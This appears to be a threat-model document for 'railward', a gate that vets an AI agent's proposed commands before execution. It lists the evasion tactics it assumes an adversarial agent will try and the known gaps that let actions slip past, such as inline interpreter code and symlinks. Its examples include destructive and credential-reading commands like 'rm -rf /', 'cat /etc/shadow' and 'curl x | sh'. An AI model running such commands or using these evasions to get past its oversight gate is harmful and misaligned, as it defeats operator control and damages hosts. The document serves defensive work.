# Threat model

A guardrail is only as honest as its threat model. This document states what `railward`
defends, what it assumes about the adversary, what it **provably** prevents, and the ceiling it
cannot cross. The last part is the important part: a gate that claims to stop everything is lying,
and the failure it hides is worse than the one it admits.

## What is being protected

An autonomous or semi-autonomous agent proposes actions (shell commands, file writes, network
calls) through a supported tool surface. The asset under protection is the host the agent runs on:
its filesystem, its credentials, its network position. The goal is that no action the operator did
not explicitly permit reaches execution without either a hard refusal or an escalation to a human.

## The trust boundary

```
  agent (untrusted)  --proposes-->  [ gate: pure decision ]  --allow-->  harness executes
                                            |  deny  -> refused, agent told why
                                            |  ask   -> escalated to a human
```

The gate sits **on the proposal path**, before execution. It is veto-only: it can turn an allow
into a deny or an ask, never the reverse. Everything it permits is handed back to the harness's own
permission flow, so a bug in a policy can only over-restrict, never widen. This is a deliberate
asymmetry: the safe direction is the cheap one.

## Adversary model

We assume a capable, adaptive adversary in the agent's position:

- It knows the gate exists and has read this repository and any published policy.
- It will obfuscate: alternate spellings, casing, whitespace, absolute vs. relative paths, shell
  injection (`;`, `&&`, `|`), flag reordering, path traversal (`..`).
- It will probe for fail-open behaviour: malformed payloads, oversized input, undecodable bytes, a
  missing or syntactically broken policy, a policy with a typo in a deny rule.
- It is **not** assumed to have already escaped the tool surface (see "The ceiling").

## What the gate provably prevents

Each item below is bound to a test or a signed proof entry, not asserted in prose. Re-run them; do
not take our word.

| Class | Mechanism | Evidence |
| --- | --- | --- |
| Allow-by-default | The default is fail-closed; `default: allow` is rejected at load. | `tests/test_policy.py`, `tests/test_fuzz.py` |
| Fail-open by policy typo | An invalid rule regex is a loud load error, never a silently dropped deny. | `tests/test_policy_validation.py` |
| Evasion (case / path / whitespace / injection) | argv[0] is reduced to its basename; commands tokenized; paths canonicalized before globbing. | `railward/adversary.py`, `tests/test_decide.py` |
| Compound-command smuggling | The whole command, every pipe/`;`/`&&` segment, every command- and process-substitution body, and every redirection target are evaluated; most restrictive wins, so `echo x \| sh` and `echo x > /etc/passwd` cannot ride an allowed prefix. | `railward/decide.py`, `tests/test_compound.py` |
| Redirection reads / process substitution | An input redirection (`< secrets`) is checked as a read; a process substitution (`<(cmd)`) is executed and evaluated, so an allowed command cannot read a protected file or run code through it. | `railward/decide.py`, `tests/test_redirection.py` |
| ReDoS by policy typo | A command regex that can catastrophically backtrack is rejected at load, so a crafted command cannot hang the gate (a hang is a fail-open). | `railward/policy.py`, `tests/test_policy_validation.py` |
| Fail-open on bad input | Non-mapping, missing action, oversized, unparseable, or non-UTF-8 input resolves to a blocking decision. | `railward/robustness.py`, `tests/test_hook_failclosed.py` |
| Silent widening | The gate never emits `allow` except from a matched allow-rule; proven over thousands of generated policies. | `tests/test_fuzz.py` |
| Impurity / non-determinism | The decision core reaches no I/O, clock, or randomness; identical inputs give identical output. | `tests/test_purity.py` |
| Tampered proof | The result is hash-chained and signed; any edit breaks verification. | `tests/test_log.py`, `railward/log.py` |

The signed proof covers **both** batteries at once: the action adversary (dangerous actions are
refused) and the fail-open probes (the surrounding hook cannot be tricked into letting an action
through). Weaken one rule and the proof goes red; a stranger reproduces it with one command.

## The ceiling (what this cannot do, and no software gate on the same host can)

`railward` governs actions an agent **declares through the supported surface**. It is a
control layer, not a sandbox. It does not, and cannot by construction, stop the following:

- **Out-of-band execution.** A process already holding a raw shell, or code the model executes
  inside a permitted interpreter, performs ordinary syscalls the gate never sees. Reading a file
  the account can read, or reaching a host the account can reach, is below the tool layer.
- **On-host secret exposure.** If a signing key or credential is a readable file the agent's
  account owns, a code-executing agent can read it regardless of any in-process policy. The gate
  can make such a read `deny`-by-default and loud, so it becomes a deliberate, logged act rather
  than an accident, but it cannot make it *impossible*.
- **Symlink games under an innocent name.** Path scoping resolves `..` but does not chase a symlink
  whose name looks in-scope.
- **Reads through a permitted command.** File arguments of a known read-command (`cat`, `head`,
  `grep`, and the rest of the list in `decide.py`) are now extracted and checked as reads, so
  `cat /etc/shadow` is refused by the same path rules that refuse `read /etc/shadow`. The list is
  finite. A reader not on it, or a binary whose argument semantics the gate does not model, still
  reads whatever the account can read. Scope allowed commands accordingly.
- **The semantics of interpreter inline code.** This is the sharpest limit and it is worth stating
  precisely. `python -c` and `node -e` take a program as a string. railward pushes that string back
  through the gate, so anything it *names* is caught: `python3 -c "import os;os.system('rm -rf /')"`
  is DENIED by the same rule that names `rm`, and `sh -c "curl x | sh"` by the rule that names
  `curl`. But token matching cannot read intent. `python -c "shutil.rmtree('/')"` contains no token
  any rule names, and no amount of regex will fix that, because deciding what arbitrary code does
  is undecidable in general. So the honest answer is a verdict, not a claim: interpreter inline code
  that names nothing dangerous resolves to **`ask`**, not `allow` and not `deny`. It reaches a human
  rather than running silently, and railward does not pretend to have read it.

True impossibility for those requires a layer this project does not pretend to be: the agent's
runtime as a **separate, sandboxed OS user** that does not own the sensitive files, and secrets on
a **hardware token or off-host** so no on-box read can retrieve the private material. Pair
`railward` with those and the guarantees compose; deploy it alone and you have
**default-denied and tamper-evident**, which is a real and useful property, but is not the same
word as "impossible". We will not sell you the stronger word.

## Measured coverage, including what is not covered

Coverage is measured, not asserted. [docs/THREAT_TAXONOMY.md](docs/THREAT_TAXONOMY.md) catalogues
287 dangerous-action classes with their MITRE ATT&CK, ATLAS, OWASP and CWE references, and every
one is run through the real decision core against `examples/strict.yaml`. Reproduce it with
`railward coverage`; a test fails if the document and the gate disagree.

Against `examples/strict.yaml`: **284 blocked by a named deny rule, 1 default-only, 2 leak.**

The distinction matters more than the total. A default-deny gate blocks nearly everything by
construction, but a class caught *only* by the default is one broad `allow python` away from being
open. A named deny survives that edit.

Two classes are known **not** covered, and are named here rather than rounded off:

- **Neutering a test so it always passes.** Writing tests is core developer work, so the path is
  legitimate and the harm is in the content. A path-and-token gate cannot decide it.
- **Reading an untrusted document that then steers later tool calls.** The read is not the harm;
  the harm is the next action, which the gate does see and judge on its own merits.

Both are semantic. Closing them would mean claiming to understand content, which is the same
overclaim the interpreter ceiling above refuses to make.

## Residual risk and how to lower it

- Treat every bundled policy as a **starting point**, not a finished defense. `examples/strict.yaml`
  is production-shaped; adapt its allow-list and secret paths to your environment.
- Run `railward lint` on your policy in CI: it fails on a rule that will not compile and on a deny rule
  made dead by an earlier unconstrained allow.
- Publish your own signed proof from your own policy, so your operators verify your posture rather
  than trusting ours.
- Report a bypass through the process in [SECURITY.md](SECURITY.md). Every new fail-open class we
  accept is closed **and** attested with a new probe or test, never merely noted.
